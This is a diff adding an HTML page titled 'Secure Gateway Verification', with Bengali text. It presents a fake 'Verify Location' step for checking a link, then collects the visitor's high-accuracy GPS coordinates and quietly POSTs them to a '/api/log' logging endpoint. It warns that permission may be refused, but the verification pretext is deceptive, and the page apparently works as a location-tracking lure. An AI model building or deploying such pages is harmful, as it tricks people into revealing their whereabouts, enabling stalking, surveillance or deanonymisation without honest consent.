@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Gateway Verification</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #0c0c0d;
+            color: #00ff66;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .box {
+            text-align: center;
+            padding: 30px;
+            background-color: #16161a;
+            border: 2px solid #00ff66;
+            border-radius: 10px;
+            max-width: 420px;
+            box-shadow: 0 0 20px rgba(0, 255, 102, 0.15);
+        }
+        .warning-box {
+            color: #ff3333;
+            font-weight: bold;
+            font-size: 14px;
+            border: 1px solid #ff3333;
+            padding: 12px;
+            margin-bottom: 25px;
+            background: rgba(255, 51, 51, 0.08);
+            line-height: 1.5;
+        }
+        .btn {
+            background-color: #00ff66;
+            color: #000;
+            border: none;
+            padding: 12px 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: 0.3s;
+        }
+        .btn:hover {
+            background-color: #00cc52;
+            box-shadow: 0 0 15px #00ff66;
+        }
+        #result {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #ffffff;
+            word-wrap: break-word;
+        }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>GATEWAY VERIFICATION</h2>
+    
+    <!-- আপনার শর্তানুযায়ী সতর্কবার্তা -->
+    <div class="warning-box">
+        সতর্কতা: আপনি যদি আপনার লাইভ লোকেশন বা বর্তমান অবস্থান শেয়ার করতে না চান, তবে ব্রাউজারের পরবর্তী পপআপে লোকেশন পারমিশন দেবেন না (Block / Don't Allow করুন)।
+    </div>
+    
+    <p>লিঙ্কটি যাচাই করতে নিচের বাটনে ক্লিক করুন:</p>
+    <button class="btn" onclick="requestLocation()">Verify Location</button>
+    
+    <div id="result"></div>
+</div>
+
+<script>
+function requestLocation() {
+    const resultDiv = document.getElementById('result');
+    resultDiv.innerHTML = "Processing system request...";
+
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const acc = position.coords.accuracy;
+
+                resultDiv.innerHTML = `<span style="color: #00ff66;">Verification Success!</span><br><br>Latitude: ${lat}<br>Longitude: ${lon}`;
+                
+                // Vercel Serverless Function-এ ডেটা পাঠানোর কোড
+                try {
+                    await fetch('/api/log', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: acc })
+                    });
+                } catch (err) {
+                    console.error("Transmission failed:", err);
+                }
+            },
+            (error) => {
+                if (error.code === error.PERMISSION_DENIED) {
+                    resultDiv.innerHTML = `<span style="color: #ff3333;">অ্যাক্সেস মেলেনি:</span> আপনি লোকেশন শেয়ার করার অনুমতি দেননি।`;
+                } else {
+                    resultDiv.innerHTML = `<span style="color: #ff3333;">ত্রুটি:</span> লোকেশন ডেটা পাওয়া যায়নি।`;
+                }
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+    } else {
+        resultDiv.innerHTML = "Geolocation API is not supported by this browser.";
+    }
+}
+</script>
+
+</body>
+</html>
